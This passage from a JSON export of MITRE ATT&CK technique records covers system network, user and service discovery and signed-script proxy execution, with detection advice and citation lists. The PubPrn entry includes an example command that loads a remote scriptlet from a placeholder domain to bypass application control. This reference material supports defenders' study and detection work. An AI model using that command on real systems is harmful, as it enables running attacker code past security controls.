Loaders),(Citation: IBM Ransomware Trends September 2020),(Citation: Trend Micro TeamTNT),(Citation: McAfee Cuba April 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Lazarus RATANKBA),(Citation: Palo Alto T9000 Feb 2016),(Citation: TrendMicro Taidoor),(Citation: Symantec Naid June 2012),(Citation: Securelist Octopus Oct 2018),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Nltest Manual),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye APT41 Aug 2019),(Citation: evolution of pirpi),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: ESET Industroyer),(Citation: Dell TG-3390),(Citation: Novetta Blockbuster),(Citation: Forcepoint Felismus Mar 2017),(Citation: FireEye FIN6 Apr 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET ForSSHe December 2018),(Citation: Cofense Astaroth Sept 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: Symantec W32.Duqu),(Citation: Awake Security Avaddon),(Citation: McAfee Shamoon December 2018),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Accenture MUDCARP March 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: ESET Zebrocy May 2019),(Citation: ASERT Donot March 2018),(Citation: Kaspersky Turla),(Citation: DFIR Phosphorus November 2021),(Citation: CrowdStrike IceApple May 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Cylance Dust Storm),(Citation: Talos Olympic Destroyer 2018),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Unit 42 VERMIN Jan 2018),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Securelist Dtrack),(Citation: Emissary Trojan Feb 2016),(Citation: ESET Kobalos Jan 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Palo Alto Reaver Nov 2017),(Citation: Trend Micro Black Basta October 2022),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: ThreatExpert Agent.btz),(Citation: Microsoft PLATINUM April 2016),(Citation: 360 Machete Sep 2020),(Citation: NCC Group Chimera January 2021),(Citation: Malwarebytes Higaisa 2020),(Citation: Symantec Buckeye),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Talos GravityRAT),(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: CISA WellMail July 2020),(Citation: ESET InvisiMole June 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Unit 42 Playbook Dec 2017),(Citation: Cybereason Royal December 2022),(Citation: US-CERT TA18-074A),(Citation: Symantec Waterbug Jun 2019),(Citation: Cybereason Bazar July 2020),(Citation: CISA WellMess July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: GitHub Sliver Ifconfig),(Citation: PWC KeyBoys Feb 2017),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: BiZone Lizar May 2021),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: ESET Operation Groundbait),(Citation: Mandiant APT41),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: Group IB Ransomware September 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET ComRAT May 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: F-Secure The Dukes),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: FireEye APT10 Sept 2018),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Unit42 Azorult Nov 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: TrendMicro MacOS April 2018),(Citation: DigiTrust NanoCore Jan 2017),(Citation: GitHub Pupy),(Citation: McAfee GhostSecret),(Citation: SecTools nbtscan June 2003),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1016.001","name":"System Network Configuration Discovery: Internet Connection Discovery","description":"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.","url":"https://attack.mitre.org/techniques/T1016/001","created":"17 March 2021","last modified":"25 March 2021","version":"1.0","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Command and Control, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to check Internet connectivity.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1016","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Kaspersky QakBot September 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Kaspersky Lyceum October 2021),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: McAfee Sharpshooter December 2018),(Citation: Symantec Shuckworm January 2022),(Citation: ESET ComRAT May 2020),(Citation: Microsoft NICKEL December 2021),(Citation: Lunghi Iron Tiger Linux),(Citation: FoxIT Wocao December 2019),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Microsoft Actinium February 2022),"}
{"ID":"T1049","name":"System Network Connections Discovery","description":"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)","url":"https://attack.mitre.org/techniques/T1049","created":"31 May 2017","last modified":"06 September 2022","version":"2.4","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"IaaS, Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Dragos Crashoverride 2018),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Mandiant APT1),(Citation: NHS Digital Egregor Nov 2020),(Citation: AlienVault Sykipot 2011),(Citation: Palo Alto Comnie),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: FoxIT Wocao December 2019),(Citation: McAfee Lazarus Nov 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Antiy CERT Ramsay April 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Okrum July 2019),(Citation: CME Github September 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Kaspersky Andariel Ransomware June 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit 42 Lucifer June 2020),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Kaspersky Poseidon Group),(Citation: FireEye APT34 Dec 2017),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: GovCERT Carbon May 2016),(Citation: Trend Micro Muddy Water March 2021),(Citation: Secureworks Karagany July 2019),(Citation: Symantec Orangeworm April 2018),(Citation: RATANKBA),(Citation: FOX-IT May 2016 Mofang),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: FireEye NETWIRE March 2019),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: CIRCL PlugX March 2013),(Citation: FireEye admin@338),(Citation: CarbonBlack Conti July 2020),(Citation: Avira Mustang Panda January 2020),(Citation: FireEye MESSAGETAP October 2019),(Citation: McAfee Babuk February 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: PWC Cloud Hopper April 2017),(Citation: CheckPoint Naikon May 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Symantec Volgmer Aug 2014),(Citation: NCC Group APT15 Alive and Strong),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Trend Micro TeamTNT),(Citation: McAfee Cuba April 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: FireEye Clandestine Fox),(Citation: FireEye APT41 Aug 2019),(Citation: evolution of pirpi),(Citation: Trend Micro Waterbear December 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: GitHub Sliver Netstat),(Citation: Symantec W32.Duqu),(Citation: Savill 1999),(Citation: ESET Zebrocy May 2019),(Citation: Kaspersky Turla),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Securelist Dtrack),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Trend Micro Black Basta October 2022),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: NCC Group Chimera January 2021),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Symantec Buckeye),(Citation: Talos GravityRAT),(Citation: Kaspersky Turla Aug 2014),(Citation: Kaspersky QakBot September 2021),(Citation: McAfee Maze March 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: BiZone Lizar May 2021),(Citation: Palo Alto OilRig May 2016),(Citation: ESET ComRAT May 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Group IB APT 41 June 2021),(Citation: FireEye APT38 Oct 2018),(Citation: TechNet Netstat),(Citation: GitHub Pupy),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1033","name":"System Owner/User Discovery","description":"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)","url":"https://attack.mitre.org/techniques/T1033","created":"31 May 2017","last modified":"12 April 2023","version":"1.4","tactics":"Discovery","detection":"`System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations.","platforms":"Linux, Network, Windows, macOS","data sources":"Active Directory: Active Directory Object Access, Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Access, Process: Process Creation, Windows Registry: Windows Registry Key Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: XAgentOSX 2017),(Citation: BlackBerry Amadey 2020),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FireEye APT32 April 2020),(Citation: FoxIT Wocao December 2019),(Citation: Securelist WhiteBear Aug 2017),(Citation: Talos Konni May 2017),(Citation: Novetta Blockbuster RATs),(Citation: Unit42 BabyShark Feb 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: Costa AvosLocker May 2022),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ATT Sidewinder January 2021),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Korean FSI TA505 2020),(Citation: ESET Grandoreiro April 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: FSecure Lokibot November 2019),(Citation: ESET OceanLotus),(Citation: ESET Okrum July 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Zebrocy Nov 2018),(Citation: Fidelis njRAT June 2013),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Lucifer June 2020),(Citation: Sophos New Ryuk Attack October 2020),(Citation: ANSSI Sandworm January 2021),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Github Koadic),(Citation: Unit 42 QUADAGENT July 2018),(Citation: FireEye APT37 Feb 2018),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Lunghi Iron Tiger Linux),(Citation: McAfee Night Dragon),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Profero APT27 December 2020),(Citation: Debian nbtscan Nov 2019),(Citation: APT15 Intezer June 2018),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Group IB GrimAgent July 2021),(Citation: Proofpoint TA505 Jan 2019),(Citation: Mandiant APT1 Appendix),(Citation: NCC Group Team9 June 2020),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: McAfee Gold Dragon),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Symantec Orangeworm April 2018),(Citation: ClearSky Siamesekitten August 2021),(Citation: Securelist APT10 March 2021),(Citation: Secureworks Karagany July 2019),(Citation: Talos Cobalt Group July 2018),(Citation: RATANKBA),(Citation: Proofpoint TA505 October 2019),(Citation: Palo Alto OilRig Oct 2016),(Citation: Cybereason Valak May 2020),(Citation: FireEye HAWKBALL Jun 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Check Point APT34 April 2021),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Palo Alto MoonWind March 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: Forcepoint Monsoon),(Citation: Malwarebytes Dyreza November 2015),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Symantec Dragonfly),(Citation: Google EXOTIC LILY March 2022),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Baumgartner Naikon 2015),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: fsecure NanHaiShu July 2016),(Citation: Unit42 Molerat Mar 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Lazarus APT January 2022),(Citation: Cylance Shaheen Nov 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CrowdStrike BloodHound April 2018),(Citation: TrendMicro TropicTrooper 2015),(Citation: Unit 42 NOKKI Sept 2018),(Citation: FireEye FIN10 June 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: ESET Dukes October 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Unit 42 RGDoor Jan 2018),(Citation: Talos Oblique RAT March 2021),(Citation: CheckPoint Naikon May 2020),(Citation: Volexity PowerDuke November 2016),(Citation: Securelist Denis April 2017),(Citation: TrendMicro EarthLusca 2022),(Citation: Fortinet Diavol July 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Novetta Blockbuster Loaders),(Citation: Palo Alto T9000 Feb 2016),(Citation: Cybereason Chaes Nov 2020),(Citation: Securelist Octopus Oct 2018),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Prevailion EvilNum May 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Fidelis Turbo),(Citation: FireEye APT41 Aug 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Novetta Blockbuster),(Citation: Forcepoint Felismus Mar 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: ESET ForSSHe December 2018),(Citation: Talos Group123),(Citation: FireEye Operation Double Tap),(Citation: Talos ZxShell Oct 2014),(Citation: Sofacy Komplex Trojan),(Citation: FireEye FELIXROOT July 2018),(Citation: CISA Zebrocy Oct 2020),(Citation: ASERT Donot March 2018),(Citation: DFIR Phosphorus November 2021),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Cylance Dust Storm),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Fortinet Agent Tesla April 2018),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Palo Alto Reaver Nov 2017),(Citation: Trend Micro Black Basta October 2022),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: ThreatExpert Agent.btz),(Citation: NCC Group Chimera January 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Intrinsec Egregor Nov 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Talos GravityRAT),(Citation: Microsoft NICKEL December 2021),(Citation: Talos Micropsia June 2017),(Citation: CISA WellMail July 2020),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Kaspersky Turla Aug 2014),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: BlackBerry Bahamut),(Citation: US-CERT TA18-074A),(Citation: FireEye APT32 May 2017),(Citation: CISA WellMess July 2020),(Citation: HP SVCReady Jun 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: BiZone Lizar May 2021),(Citation: ESET Operation Groundbait),(Citation: ClearSky Lazarus Aug 2020),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Microsoft BlackCat Jun 2022),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Mandiant APT41),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET RTM Feb 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Proofpoint TA505 Mar 2018),(Citation: Talos PoetRAT April 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Unit42 Azorult Nov 2018),(Citation: Cymmetria Patchwork),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Anomali Linux Rabbit 2018),(Citation: Symantec Chafer Dec 2015),(Citation: GitHub Pupy),(Citation: SecTools nbtscan June 2003),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1216","name":"System Script Proxy Execution","description":"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)","url":"https://attack.mitre.org/techniques/T1216","created":"18 April 2018","last modified":"18 April 2022","version":"2.0","tactics":"Defense Evasion","detection":"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Application control, Digital Certificate Validation","contributors":"Praetorian; Wes Hurd","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1216.001","name":"System Script Proxy Execution: PubPrn","description":"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).","url":"https://attack.mitre.org/techniques/T1216/001","created":"03 February 2020","last modified":"18 April 2022","version":"2.0","tactics":"Defense Evasion","detection":"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1216","defenses bypassed":"Application Control, Digital Certificate Validation","contributors":"Atul Nair, Qualys","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Twitter ItsReallyNick Status Update APT32 PubPrn),(Citation: Microsoft_rec_block_rules)"}
{"ID":"T1007","name":"System Service Discovery","description":"Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","url":"https://attack.mitre.org/techniques/T1007","created":"31 May 2017","last modified":"03 April 2023","version":"1.5","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Harshal Tupsamudre, Qualys","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: Palo Alto Networks BBSRAT),(Citation: TrendMicro EarthLusca 2022),(Citation: Symantec Hydraq Jan 2010),(Citation: NCC Group Chimera January 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cyble Black Basta May 2022),(Citation: Mandiant APT1),(Citation: Microsoft Tasklist),(Citation: Symantec Orangeworm April 2018),(Citation: Cisco Talos Intelligence Group),(Citation: Palo Alto Comnie),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: RATANKBA),(Citation: AlienVault Sykipot 2011),(Citation: Talos GravityRAT),(Citation: ESET GreyEnergy Oct 2018),(Citation: FoxIT Wocao December 2019),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: McAfee Cuba April 2021),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET InvisiMole June 2018),(Citation: Malwarebytes Dyreza November 2015),(Citation: S2 Grupo TrickBot June 2017),(Citation: Unit42 Emissary Panda May 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Kaspersky Adwind Feb 2016),(Citation: BlackBerry CostaRicto November 2020),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Bitdefender Naikon April 2021),(Citation: FireEye admin@338),(Citation: Trend Micro Tick November 2019),(Citation: TrendMicro Ursnif Mar 2015),(Citation: GitHub PoshC2),(Citation: Palo Alto OilRig May 2016),(Citation: Kaspersky Poseidon Group),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Talos ZxShell Oct 2014),(Citation: Trend Micro IXESHE 2012),(Citation: Carbon Black HotCroissant April 2020),(Citation: F-Secure The Dukes),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee Babuk February 2021),(Citation: Savill 1999),(Citation: Lunghi Iron Tiger Linux),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Kaspersky Lab SynAck May 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Kaspersky Turla),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Cylance Dust Storm),(Citation: US-CERT Volgmer Nov 2017),(Citation: Emissary Trojan Feb 2016),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Symantec WastedLocker June 2020),(Citation: Lotus Blossom Jun 2015),(Citation: Intel 471 REvil March 2020),"}
